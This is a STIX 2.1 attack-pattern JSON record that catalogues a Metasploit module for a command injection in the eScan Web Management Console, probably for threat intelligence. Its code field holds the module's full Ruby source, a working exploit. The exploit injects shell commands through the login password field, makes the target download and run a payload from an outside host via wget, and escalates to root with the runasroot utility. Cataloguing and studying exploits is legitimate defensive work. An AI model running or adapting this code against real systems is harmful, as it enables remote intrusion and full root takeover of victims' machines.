{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb077e83-e4f5-49ad-aef3-6985e8d65734",
    "created": "2024-08-14T16:59:55.741777Z",
    "modified": "2024-08-14T16:59:55.741781Z",
    "name": "\"eScan Web Management Console Command Injection\"",
    "description": " This module exploits a command injection vulnerability found in the eScan Web Management Console. The vulnerability exists while processing CheckPass login requests. An attacker with a valid username can use a malformed password to execute arbitrary commands. With mwconf privileges, the runasroot utility can be abused to get root privileges. This module has been tested successfully on eScan 5.5-2 on Ubuntu 12.04.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/antivirus/escan_password_exec.rb",
            "external_id": "escan_password_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.joxeankoret.com/download/breaking_av_software-pdf.tar.gz#SyscanslidesbyJoxean"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"eScan Web Management Console Command Injection\",\n      'Description'    => %q{\n        This module exploits a command injection vulnerability found in the eScan Web Management\n        Console. The vulnerability exists while processing CheckPass login requests. An attacker\n        with a valid username can use a malformed password to execute arbitrary commands. With\n        mwconf privileges, the runasroot utility can be abused to get root privileges. This module\n        has been tested successfully on eScan 5.5-2 on Ubuntu 12.04.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Joxean Koret', # Vulnerability Discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.joxeankoret.com/download/breaking_av_software-pdf.tar.gz' ] # Syscan slides by Joxean\n        ],\n      'Payload'        =>\n        {\n          'BadChars'    => \"\", # Real bad chars when injecting: \"|&)(!><'\\\"` \", cause of it we're avoiding ARCH_CMD\n          'DisableNops' => true\n        },\n      'Arch'           => ARCH_X86,\n      'Platform'       => 'linux',\n      'Privileged'     => true,\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          ['eScan 5.5-2 / Linux', {}],\n        ],\n      'DisclosureDate' => '2014-04-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(10080),\n        OptString.new('USERNAME', [ true, 'A valid eScan username' ]),\n        OptString.new('TARGETURI', [true, 'The base path to the eScan Web Administration console', '/']),\n        OptString.new('EXTURL', [ false, 'An alternative host to request the EXE payload from' ]),\n        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10]),\n        OptString.new('WRITABLEDIR', [ true, 'A directory where we can write files', '/tmp' ]),\n        OptString.new('RUNASROOT', [ true, 'Path to the runasroot binary', '/opt/MicroWorld/sbin/runasroot' ]),\n      ])\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path.to_s, 'index.php')\n    })\n\n    if res and res.code == 200 and res.body =~ /eScan WebAdmin/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def cmd_exec(session, cmd)\n    case session.type\n    when /meterpreter/\n      print_warning(\"Use a shell payload in order to get root!\")\n    when /shell/\n      o = session.shell_command_token(cmd)\n      o.chomp! if o\n    end\n    return \"\" if o.nil?\n    return o\n  end\n\n  # Escalating privileges here because runasroot only can't be executed by\n  # mwconf uid (196).\n  def on_new_session(session)\n    cmd_exec(session, \"#{datastore['RUNASROOT'].shellescape} /bin/sh\")\n    super\n  end\n\n  def primer\n    @payload_url = get_uri\n    wget_payload\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request: #{request.uri}\")\n    if request.uri =~ /#{Regexp.escape(get_resource)}/\n      print_status(\"Sending payload...\")\n      send_response(cli, @pl)\n    end\n  end\n\n  def autofilter\n    true\n  end\n\n  def exploit\n    @pl           = generate_payload_exe\n\n    @payload_url  = \"\"\n\n    if datastore['EXTURL'].blank?\n      begin\n        Timeout.timeout(datastore['HTTPDELAY']) {super}\n      rescue Timeout::Error\n      end\n      exec_payload\n    else\n      @payload_url = datastore['EXTURL']\n      wget_payload\n      exec_payload\n    end\n  end\n\n  # we execute in this way, instead of an ARCH_CMD\n  # payload because real badchars are: |&)(!><'\"`[space]\n  def wget_payload\n    @dropped_elf = rand_text_alpha(rand(5) + 3)\n    command = \"wget${IFS}#{@payload_url}${IFS}-O${IFS}#{File.join(datastore['WRITABLEDIR'], @dropped_elf)}\"\n\n    print_status(\"Downloading the payload to the target machine...\")\n    res = exec_command(command)\n    if res && res.code == 302 && res.headers['Location'] && res.headers['Location'] =~ /index\\.php\\?err_msg=password/\n      register_files_for_cleanup(File.join(datastore['WRITABLEDIR'], @dropped_elf))\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to download the payload to the target\")\n    end\n  end\n\n  def exec_payload\n    command = \"chmod${IFS}777${IFS}#{File.join(datastore['WRITABLEDIR'], @dropped_elf)};\"\n    command << File.join(datastore['WRITABLEDIR'], @dropped_elf)\n\n    print_status(\"Executing the payload...\")\n    exec_command(command, 1)\n  end\n\n  def exec_command(command, timeout=20)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path.to_s, 'login.php'),\n      'vars_post' => {\n        'uname' => datastore['USERNAME'],\n        'pass' => \";#{command}\",\n        'product_name' => 'escan',\n        'language' => 'English',\n        'login' => 'Login'\n      }\n    }, timeout)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-04",
    "x_mitre_platforms": [
        "linux'"
    ]
}